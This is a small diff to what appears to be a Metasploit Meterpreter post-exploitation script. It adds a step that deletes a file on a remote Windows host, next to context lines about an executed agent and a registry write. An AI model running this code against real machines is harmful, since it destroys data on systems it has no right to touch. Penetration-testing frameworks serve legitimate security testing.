@@ -115,6 +115,13 @@ print_status("Agent executed with PID #{proc.pid}")
 
 
 #
+# delete remote file (windows)
+#
+client.fs.file.rm("c:\\oldman\\file.txt")
+
+
+
+#
 # write reg key remote
 #
 nam = Rex::Text.rand_text_alpha(rand(8)+8)
